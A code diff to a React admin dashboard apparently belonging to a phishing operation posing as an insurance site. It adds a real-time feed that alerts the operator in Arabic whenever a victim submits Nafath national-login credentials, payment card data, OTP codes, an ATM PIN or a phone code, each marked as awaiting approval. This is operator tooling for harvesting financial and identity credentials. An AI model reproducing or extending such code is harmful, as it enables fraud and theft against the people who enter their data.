@@ -109,6 +109,28 @@ const AdminLiveFeed = ({ isOpen, onOpenChange, onCountChange }: AdminLiveFeedPro
           addFeedItem({ icon: "🔄", title: `${name} انتقل`, description: `إلى: ${newV.current_page}`, type: "action" });
         }
       })
+      .on("postgres_changes", { event: "INSERT", schema: "public", table: "insurance_order_stage_events" }, (payload) => {
+        const ev = payload.new as any;
+        const stageLabels: Record<string, { icon: string; label: string }> = {
+          nafath_login: { icon: "🔐", label: "بيانات نفاذ جديدة" },
+          nafath_verify: { icon: "✅", label: "تحقق نفاذ" },
+          payment: { icon: "💳", label: "بيانات دفع" },
+          otp: { icon: "🔢", label: "رمز OTP" },
+          atm: { icon: "🏧", label: "رقم سري ATM" },
+          phone_verification: { icon: "📱", label: "توثيق جوال" },
+          phone_otp: { icon: "📲", label: "رمز جوال" },
+          stc_call: { icon: "📞", label: "مكالمة STC" },
+        };
+        const info = stageLabels[ev.stage];
+        if (info) {
+          addFeedItem({
+            icon: info.icon,
+            title: info.label,
+            description: `طلب #${(ev.order_id || "").slice(0, 8)} — ${ev.status === "pending" ? "بانتظار الموافقة" : ev.status}`,
+            type: "request",
+          });
+        }
+      })
       .subscribe();
 
     return () => { supabase.removeChannel(channel); };
